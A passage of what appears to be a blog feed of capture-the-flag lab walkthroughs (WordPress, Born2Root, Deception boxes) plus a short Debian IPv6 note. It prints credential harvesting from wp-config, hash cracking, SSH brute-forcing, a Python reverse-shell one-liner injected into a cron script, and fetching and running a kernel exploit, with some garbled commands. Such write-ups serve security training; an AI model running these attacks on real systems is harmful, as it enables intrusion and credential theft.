<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ cat wp-config.phpcat wp-config.php&lt;?php...// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);/** MySQL database username */define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);/** MySQL database password */define(&#x27;DB_PASSWORD&#x27;, &#x27;rootpassword!&#x27;);/** MySQL hostname */define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);/** Database Charset to use in creating database tables. */define(&#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27;);...</span><br></pre></td></tr></table></figure>

<p>We have discovered the credentials <code>root:rootpassword!</code>.</p>
<h3 id="MySQL-Enumeration"><a href="#MySQL-Enumeration" class="headerlink" title="MySQL Enumeration"></a><strong>MySQL Enumeration</strong></h3><p>Using the discovered credentials, we can now see what is inside the local database. Let’s list the available tables inside the <code>wordpress</code> database:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ mysql -u root -p -D wordpress -e &#x27;SHOW TABLES;&#x27;Enter password: rootpassword!+----------------------------+| Tables_in_wordpress        |+----------------------------+| wp_abtest_experiments      || wp_abtest_goal_hits        || wp_abtest_goals            || wp_abtest_ip_filters       || wp_abtest_variation_views  || wp_abtest_variations       || wp_commentmeta             || wp_comments                || wp_links                   || wp_masta_campaign          || wp_masta_cronapi           || wp_masta_list              || wp_masta_reports           || wp_masta_responder         || wp_masta_responder_reports || wp_masta_settings          || wp_masta_subscribers       || wp_masta_support           || wp_options                 || wp_postmeta                || wp_posts                   || wp_term_relationships      || wp_term_taxonomy           || wp_terms                   || wp_usermeta                || wp_users                   |+----------------------------+</span><br></pre></td></tr></table></figure>

<p>User tables are always interesting to enumerate. Inside the <code>wp_users</code> table, we find a couple of records:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ mysql -u root -p -D wordpress -e &#x27;SELECT * FROM wp_users;&#x27;Enter password: rootpassword!+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk        | mdemir@btrisk.com |          | 2017-04-24 17:37:04 |                     |           0 | btrisk       ||  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin         | ikaya@btrisk.com  |          | 2017-04-24 17:37:04 |                     |           4 | admin        |+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+</span><br></pre></td></tr></table></figure>

<p>We find two users here: <code>root</code> and <code>admin</code>, and their passwords were hashed using the MD5 hashing algorithm.</p>
<h3 id="Password-Hash-Cracking"><a href="#Password-Hash-Cracking" class="headerlink" title="Password Hash Cracking"></a><strong>Password Hash Cracking</strong></h3><p>We are already familiar with the <code>admin</code> user; so, we can try cracking the password hash of the <code>root</code> user using <code>john</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cat hasha318e4507e5a74604aafb45e4741edd3kali@kali:~$kali@kali:~$ john --format=raw-md5 hashUsing default input encoding: UTF-8Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])Warning: no OpenMP support for this hash type, consider --fork=2Proceeding with single, rules:SinglePress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusAlmost done: Processing the remaining buffered candidate passwords, if any.Proceeding with wordlist:/usr/share/john/password.lst, rules:WordlistProceeding with incremental:ASCII0g 0:00:00:22  3/3 0g/s 54937Kp/s 54937Kc/s 54937KC/s 149600491..149602713roottoor         (?)1g 0:00:00:59 DONE 3/3 (2021-01-13 07:54) 0.01693g/s 57641Kp/s 57641Kc/s 57641KC/s roottim2..roott11eUse the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliablySession completed</span><br></pre></td></tr></table></figure>

<p>The cracker finds the password to be <code>roottoor</code>.</p>
<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a><strong>SSH</strong></h3><p>Having recovered <code>root</code> user’s password, we can now simply SSH in:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ssh root@192.168.120.40</span><br><span class="line">...</span><br><span class="line">root@192.168.120.40&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line">Last login: Thu Jul  9 07:32:53 2020 from 192.168.118.8</span><br><span class="line">root@ubuntu:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:~#</span><br></pre></td></tr></table></figure>

<p>Focus：</p>
<p>可以用42298.c通过内核提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**gcc 44298.c -o 44298**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**python -m SimpleHTTPMailServer 80**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**<span class="built_in">cd</span> /tmp**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**wget http://**192.168.49.67/**44298**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**chmod 777 44298**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**./44298**</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Reverse Shell</tag>
        <tag>Wordpress</tag>
        <tag>Mysql</tag>
        <tag>Msfconsole</tag>
        <tag>Kernel Exploit</tag>
        <tag>Hash Cracking</tag>
      </tags>
  </entry>
  <entry>
    <title>Born2Root</title>
    <url>/undefined/Born2Root/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Born2Root"><a href="#Exploitation-Guide-for-Born2Root" class="headerlink" title="Exploitation Guide for Born2Root"></a><strong>Exploitation Guide for Born2Root</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We initiate our enumeration of the target by launching two <code>nmap</code> scans. The first one will identify open ports, and the second one will attempt to discover more information about each service.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.54.49</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-22 11:53 SAST</span><br><span class="line">Nmap scan report for 192.168.54.49</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">111/tcp open  rpcbind</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p 22,80,111 -A 192.168.54.49</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-22 11:53 SAST</span><br><span class="line">Nmap scan report for 192.168.54.49</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)</span><br><span class="line">|   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)</span><br><span class="line">|   256 d4:02:99:b0:e7:7d:40:18:64:df:3b:28:5b:9e:f9:07 (ECDSA)</span><br><span class="line">|_  256 e9:c4:0c:6d:4b:15:4a:58:4f:69:cd:df:13:76:32:4e (ED25519)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-robots.txt: 2 disallowed entries</span><br><span class="line">|_/wordpress-blog /files</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title:  Secretsec Company</span><br><span class="line">111/tcp open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          39832/tcp6  status</span><br><span class="line">|   100024  1          47504/udp   status</span><br><span class="line">|   100024  1          50443/udp6  status</span><br><span class="line">|_  100024  1          52205/tcp   status</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We have a web server running on port 80 and when browsing to the website, we find a company web page with general and contact related information.</p>
<p>We should take note of the username <code>martin</code> that appears twice on this page: in the <strong>About Us</strong> section and in the <strong>Contact Us</strong> section.</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_20_image_1_oFSIpGVq.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_20_image_1_oFSIpGVq.png"></p>
<h3 id="GoBuster"><a href="#GoBuster" class="headerlink" title="GoBuster"></a><strong>GoBuster</strong></h3><p>We will use <code>GoBuster</code> to do a brute force scan in an attempt to discover any other folders present on the web server using the <strong>common.txt</strong> wordlist.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ locate common.txt</span><br><span class="line">...</span><br><span class="line">/usr/lib/python3/dist-packages/mercurial/helptext/common.txt</span><br><span class="line">/usr/share/dirb/wordlists/common.txt</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ gobuster dir -t 20 -w /usr/share/dirb/wordlists/common.txt --url http://192.168.54.49</span><br><span class="line">...</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/files (Status: 301)</span><br><span class="line">/icons (Status: 301)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/manual (Status: 301)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Gobuster finds a directory named <em>/icons</em> containing a text file <strong>VDSoyuAXiO.txt</strong>. This file contains an SSH Key. We will download the key and save it to a file.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.54.49/icons/VDSoyuAXiO.txt &gt;&gt; born</span><br><span class="line">kali@kali:~$ cat born</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC</span><br><span class="line">...</span><br><span class="line">2o1pyGm7j7wfhIZNBP/wwJSC2/NLV6rQeH7Zj8nFv69RcRX56LrQZjFAWWsa/C43</span><br><span class="line">rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Local-SSH-Access"><a href="#Local-SSH-Access" class="headerlink" title="Local SSH Access"></a><strong>Local SSH Access</strong></h3><p>Let’s give this key proper permissions and then use it to SSH as <code>martin</code> (we can just hit enter when prompted for <code>secret password</code>).</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ chmod 0600 born</span><br><span class="line">kali@kali:~$ ssh martin@192.168.120.52 -i born</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">READY TO ACCESS THE SECRET LAB ?</span><br><span class="line"></span><br><span class="line">secret password :</span><br><span class="line">WELCOME !</span><br><span class="line">martin@debian:~$ id</span><br><span class="line">uid=1001(martin) gid=1001(martin) groups=1001(martin)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Checking all the cronjobs scheduled on the system, we find a python file that is readable, and the cronjob is scheduled for a user named <code>Jimmy</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">martin@debian:~$ cat /etc/cron*</span><br><span class="line">...</span><br><span class="line">*/5   * * * *   jimmy   python /tmp/sekurity.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a><strong>Reverse Shell</strong></h3><p>We can copy a Python reverse shell into the <strong>sekurity.py</strong> file and wait 5 minutes for the cronjob to be executed.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.49.54&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We need to set up a netcat listener on our Kali machine to catch the reverse shell that is going to get executed on the target system.</p>
<p>After a few minutes, we catch our shell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -lvp 80listening on [any] 80 ...192.168.54.49: inverse host lookup failed: Unknown hostconnect to [192.168.49.54] from (UNKNOWN) [192.168.54.49] 52400/bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=1002(jimmy) gid=1002(jimmy) groups=1002(jimmy)$ python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;jimmy@debian:~$</span><br></pre></td></tr></table></figure>

<h3 id="SSH-Login-Brute-Force"><a href="#SSH-Login-Brute-Force" class="headerlink" title="SSH Login Brute-Force"></a><strong>SSH Login Brute-Force</strong></h3><p>Let’s check <strong>/etc/passwd</strong> to get a list of available users on the system:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jimmy@debian:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/falseDebian-exim:x:104:109::/var/spool/exim4:/bin/falsemessagebus:x:105:110::/var/run/dbus:/bin/falsestatd:x:106:65534::/var/lib/nfs:/bin/falsesshd:x:107:65534::/var/run/sshd:/usr/sbin/nologinhadi:x:1000:1000:hadi,,,:/home/hadi:/bin/bashmartin:x:1001:1001:,,,:/home/martin:/bin/bashjimmy:x:1002:1002:,,,:/home/jimmy:/bin/bash</span><br></pre></td></tr></table></figure>

<p>The user <code>Hadi</code> stands out as another user also mentioned on the company website.</p>
<p>We will use <code>John</code> to create a mutated wordlist containing basic usernames that include the word <code>hadi</code>. First, edit John’s configuration file <strong>/etc/john/john.conf</strong> to include more rules by adding the following to the <code>[List.Rules:Wordlist]</code> section:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># crack -&gt; cracked, crack -&gt; cracking-[:c] &lt;* &gt;2 !?A \p1[lc] M [PI] Q# Try the second half of split passwords-s x**-s-c x** M l Q# Add one number to the end of each password$[0-9]# Add two numbers to the end of each password$[0-9]$[0-9]# Add three numbers to the end of each password$[0-9]$[0-9]$[0-9]# Add four numbers to the end of each password#$[0-9]$[0-9]$[0-9]$[0-9]</span><br></pre></td></tr></table></figure>

<p>Next, we can mutate the wordlist:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ john --wordlist=passwords.txt --rules --stdout &gt; passwords-mutated.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">1161p 0:00:00:00 100.00% (2020-03-06 09:37) 19350p/s hadi999</span><br><span class="line">root@kali:~/Documents/VulnHub/born2root# wc -l passwords-mutated.txt</span><br><span class="line">1161 passwords-mutated.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now we can try brute-forcing the password for the user <code>hadi</code> using <code>Hydra</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ hydra -t 4 -l hadi -P passwords-mutated.txt 192.168.120.52 ssh</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-06 09:39:44</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 1161 login tries (l:1/p:1161), ~291 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.120.52:22/</span><br><span class="line">[STATUS] 24.00 tries/min, 24 tries in 00:01h, 1137 to do in 00:48h, 4 active</span><br><span class="line">[STATUS] 26.33 tries/min, 79 tries in 00:03h, 1082 to do in 00:42h, 4 active</span><br><span class="line">[STATUS] 23.43 tries/min, 164 tries in 00:07h, 997 to do in 00:43h, 4 active</span><br><span class="line">[STATUS] 23.67 tries/min, 284 tries in 00:12h, 877 to do in 00:38h, 4 active</span><br><span class="line">[22][ssh] host: 192.168.120.52   login: hadi   password: hadi123</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-06 09:52:26</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We find that the password is <code>hadi123</code>, and now we simply switch from our current user to <code>hadi</code> with the recovered password:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jimmy@debian:~$ su hadi</span><br><span class="line">...</span><br><span class="line">hadi@debian:/home/jimmy$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(hadi) gid=1000(hadi) groups=1000(hadi),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Escalation-to-Root"><a href="#Escalation-to-Root" class="headerlink" title="Escalation to Root"></a><strong>Escalation to Root</strong></h3><p>The password for <code>root</code> was re-used and is the same as <code>hadi</code>‘s: <code>hadi123</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hadi@debian:~$ su -</span><br><span class="line">Password:</span><br><span class="line">root@debian:~# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Reverse Shell</tag>
        <tag>Gobuster</tag>
        <tag>Brute-Force</tag>
        <tag>John</tag>
      </tags>
  </entry>
  <entry>
    <title>Debian设置GRUB启动参数禁用IPV6</title>
    <url>/undefined/Debian%E8%AE%BE%E7%BD%AEGRUB%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0%E7%A6%81%E7%94%A8IPV6/</url>
    <content><![CDATA[<h1 id="Debian设置GRUB启动参数禁用IPV6"><a href="#Debian设置GRUB启动参数禁用IPV6" class="headerlink" title="Debian设置GRUB启动参数禁用IPV6"></a>Debian设置GRUB启动参数禁用IPV6</h1><p>在国外服务商租用VPS后，发现无法使用ping命令和goolge进行交互，并出现十六进制的MAC地址</p>
<p>原因是Linux系统IPV6优先级最高，默认使用IPV6地址进行ping命令。</p>
<p>我们可以在系统中设置GRUB启动参数禁用IPV6</p>
<p>编辑 <code>/etc/default/grub</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/default/grub</span><br></pre></td></tr></table></figure>

<p>找到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet&quot;</span><br></pre></td></tr></table></figure>

<p>修改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;ipv6.disable=1 quiet&quot;</span><br></pre></td></tr></table></figure>

<p>随后执行命令更新GRUB启动参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure>

<p>最后重启系统即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Debian</tag>
        <tag>GRUB</tag>
        <tag>IPV6</tag>
      </tags>
  </entry>
  <entry>
    <title>Deception</title>
    <url>/undefined/Deception/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Deception"><a href="#Exploitation-Guide-for-Deception" class="headerlink" title="Exploitation Guide for Deception"></a><strong>Exploitation Guide for Deception</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.54.34</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-20 20:01 SAST</span><br><span class="line">Nmap scan report for 192.168.54.34</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We have found a Web server listening on port 80 and after visiting the page we discover that the index file is the default <em>apache</em> <strong>index.html</strong> file.</p>
<p>Our next step will be to execute a brute force attack against this web server.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ gobuster dir -t 20 -w /usr/share/dirb/wordlists/common.txt --url http://192.168.54.34</span><br><span class="line">...</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/javascript (Status: 301)</span><br><span class="line">/phpmyadmin (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/wordpress (Status: 301)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Our brute force attack has revealed a <strong>wordpress</strong> directory. We will use <code>wpscan</code> against this WordPress install in an attempt to discover any known vulnerabilities.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wpscan --url http://192.168.54.34/wordpress/ --enumerate u</span><br><span class="line">...</span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] haclabs</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] yash</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We were able to detect two users. This is a Wordpress installation so we should be able to find out more information by visiting the <strong>robots.txt</strong> file.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.54.34/wordpress/robots.txt</span><br><span class="line">allow : /robots.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The robots.txt file has an entry for <strong>robots.html</strong> . Visiting this page shows a file named <strong>admindelete.html</strong>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.54.34/wordpress/robots.html</span><br><span class="line">...</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var count = 1;</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">  if (count&lt;15) &#123;</span><br><span class="line">    var input = document.getElementById(&quot;uname&quot;).value;</span><br><span class="line">    alert(&quot;clicks left for noob &quot;+ input +&quot;:&quot;+ (50-count));</span><br><span class="line">    count++;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">   window.location=&quot;admindelete.html&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Browsing to the <strong>admindelete.html</strong> page results in the below message regarding hints.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.54.34/wordpress/admindelete.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;LOL,A Noob is looking for a hint&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The <strong>hint.html</strong> page tells us to collect all API tokens on the home page.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.54.34/wordpress/hint.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Please collect all the API tokens availabe on the home page&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Next, we again go to the default <em>apache</em> homepage and find API tokens placed in comment sections throughout the page.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl -s http://192.168.53.34 | grep API</span><br><span class="line">    API old0 : 5F4DCC3B5AA</span><br><span class="line"> &lt;!--API old2 : 327DEB --&gt;</span><br><span class="line">  &lt;!--API old 1 : 765D61D8 --&gt;</span><br><span class="line">                           environment&lt;!--API new : 882CF99--&gt;variables, in the default configuration, apache2 needs to be</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We combine all the API tokens until we have a string that resembles a MD5 hash.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure>

<p>Most online MD5 Decrypter tools are able to identify the hash as <code>password</code>.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><p>Using the usernames we found earlier, we attempt to SSH. Using <code>password</code> as the password doesn’t seem to work, however the hash itself seems to work, and we are able to log in with the following credentials:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username: yashPassword: 5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:$ ssh yash@192.168.54.34...opeartion going on=====================&gt; Copy password to /haclabsSystem compromised!!!ALERTCopy operation abortedyash@haclabs:~$ iduid=1001(yash) gid=1001(yash) groups=1001(yash)yash@haclabs:~$</span><br></pre></td></tr></table></figure>

